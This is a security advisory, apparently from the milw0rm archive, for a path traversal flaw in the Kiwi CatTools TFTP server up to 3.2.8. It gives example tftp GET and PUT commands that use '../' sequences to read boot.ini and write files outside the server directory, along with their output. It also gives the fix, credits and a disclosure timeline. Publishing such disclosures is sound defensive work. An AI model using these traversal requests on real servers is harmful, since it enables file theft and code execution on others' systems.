@@ -1,0 +1,55 @@
+Path traversal security vulnerability in Kiwi CatTools TFTP up to 3.2.8 
+server can lead to information disclosure and remote code execution 
+
+Risk: High 
+
+DISCUSSION 
+
+Kiwi CatTools TFTP server doesn.t properly verify filename in PUT and 
+GET request which can be used to download/upload any file from/to 
+server. Default setting allows replacing of existing files. Such 
+settings lead to probability to replace an executable files and run code 
+on attacker choice. 
+
+EXAMPLES 
+
+C:\>tftp -i 10.1.1.2 GET /x/../../../../../boot.ini boot.txt 
+
+Transfer successful: 212 bytes in 1 second, 212 bytes/s 
+
+C:\>type boot.txt 
+
+[boot loader] timeout=30 
+default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS 
+
+C:\>tftp -i 10.1.1.2 PUT boot.txt /x/../../../../../pttest.txt 
+
+Transfer successful: 212 bytes in 1 second, 212 bytes/s 
+
+C:\>type pttest.txt 
+
+[boot loader] timeout=30 
+default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS 
+
+C:\> 
+
+SOLUTION 
+
+Upgrade to CatTools 3.2.9 which is available for download at 
+http://www.kiwisyslog.com/downloads.php 
+
+CREDITS 
+
+Sergey Gordeychik of Positive Technologies (www.ptsecurity.com) 
+
+DISCLOSURE TIMELINE 
+
+Vulnerability discovered: 11/20/2006 
+
+Initial vendor contact: 12/08/2006 
+
+Patch released: 02/13/2007 
+
+Public disclosure: 02/27/2007 
+
+# milw0rm.com [2007-02-27]
